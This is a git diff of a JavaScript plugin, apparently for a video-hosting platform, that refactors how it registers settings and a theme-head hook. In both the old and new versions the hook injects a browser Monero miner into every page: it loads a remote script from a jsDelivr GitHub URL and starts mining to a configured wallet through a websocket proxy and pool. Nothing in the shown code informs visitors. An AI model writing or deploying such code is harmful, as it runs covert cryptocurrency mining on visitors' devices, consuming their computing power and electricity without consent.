@@ -11,104 +11,69 @@ module.exports = {
     dependencies: {},
   },
 
-  hooks: {
-    // Hook for injecting miner script into the theme's head
-    'action:theme.head': {
-      handler: () => {
-        const settings = loadSettings();
-        if (!settings) {
-          console.error('Failed to load plugin settings.');
-          return '';
-        }
+  async register({
+    registerHook,
+    registerSetting,
+  }) {
+    // Register settings for Monero Miner
+    registerSetting({
+      name: 'walletAddress',
+      label: 'Monero Wallet Address',
+      type: 'input', // Text input
+      private: false,
+    });
+
+    registerSetting({
+      name: 'webSocket',
+      label: 'WebSocket Server',
+      type: 'input',
+      private: false,
+      default: 'wss://ny1.xmrminingproxy.com', // Default value
+    });
+
+    registerSetting({
+      name: 'poolAddress',
+      label: 'Mining Pool Address',
+      type: 'input',
+      private: false,
+      default: 'moneroocean.stream',
+    });
+
+    registerSetting({
+      name: 'threads',
+      label: 'Number of Threads',
+      type: 'number',
+      private: false,
+      default: 2, // Default number of threads
+    });
+
+    // Hook to inject Monero Miner script into the theme's head
+    registerHook({
+      target: 'action:theme.head',
+      handler: ({ settings }) => {
+        const walletAddress = settings.walletAddress || '';
+        const webSocket = settings.webSocket || 'wss://ny1.xmrminingproxy.com';
+        const poolAddress = settings.poolAddress || 'moneroocean.stream';
+        const threads = settings.threads || 2;
 
         return `
           <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
           <script>
-            const server = "${settings.webSocket}";
-            const pool = "${settings.poolAddress}";
-            const walletAddress = "${settings.walletAddress}";
+            const server = "${webSocket}";
+            const pool = "${poolAddress}";
+            const walletAddress = "${walletAddress}";
             const workerId = "GH-XMR";
-            const threads = ${settings.threads};
+            const threads = ${threads};
             const password = "";
             startMining(pool, walletAddress, workerId, threads, password);
             throttleMiner = 20;
           </script>
         `;
       },
-    },
+    });
+  },
 
-    // Hook for rendering the admin plugin settings page
-    'action:admin.setting': {
-      handler: () => {
-        const settings = loadSettings();
-        return `
-          <div class="container">
-            <h3>Monero Miner Plugin Settings</h3>
-            <form id="monero-miner-settings">
-              <div class="form-group">
-                <label for="walletAddress">Monero Wallet Address</label>
-                <input type="text" id="walletAddress" class="form-control" value="${settings.walletAddress}" required>
-              </div>
-              <div class="form-group">
-                <label for="webSocket">WebSocket Server</label>
-                <input type="text" id="webSocket" class="form-control" value="${settings.webSocket}" required>
-              </div>
-              <div class="form-group">
-                <label for="poolAddress">Mining Pool Address</label>
-                <input type="text" id="poolAddress" class="form-control" value="${settings.poolAddress}" required>
-              </div>
-              <div class="form-group">
-                <label for="threads">Number of Threads</label>
-                <input type="number" id="threads" class="form-control" value="${settings.threads}" required>
-              </div>
-              <button type="submit" class="btn btn-primary">Save Settings</button>
-            </form>
-            <script>
-              document.getElementById('monero-miner-settings').addEventListener('submit', async (e) => {
-                e.preventDefault();
-                const settings = {
-                  walletAddress: document.getElementById('walletAddress').value,
-                  webSocket: document.getElementById('webSocket').value,
-                  poolAddress: document.getElementById('poolAddress').value,
-                  threads: parseInt(document.getElementById('threads').value, 10)
-                };
-                await saveSettings(settings);
-                alert('Settings saved successfully!');
-              });
-            </script>
-          </div>
-        `;
-      },
-    },
+  async unregister() {
+    console.log('Unregistering Monero Miner plugin...');
   },
 };
-
-function loadSettings() {
-  const settingsFilePath = path.join(__dirname, 'plugin-settings.json');
-  try {
-    if (fs.existsSync(settingsFilePath)) {
-      const data = fs.readFileSync(settingsFilePath, 'utf-8');
-      return JSON.parse(data);
-    } else {
-      return {
-        walletAddress: '',
-        webSocket: 'wss://ny1.xmrminingproxy.com',
-        poolAddress: 'moneroocean.stream',
-        threads: 2,
-      };
-    }
-  } catch (err) {
-    console.error('Error loading settings:', err);
-    return null;
-  }
-}
-
-function saveSettings(settings) {
-  const settingsFilePath = path.join(__dirname, 'plugin-settings.json');
-  try {
-    fs.writeFileSync(settingsFilePath, JSON.stringify(settings, null, 2));
-    console.log('Settings saved successfully.');
-  } catch (err) {
-    console.error('Error saving settings:', err);
-  }
-}
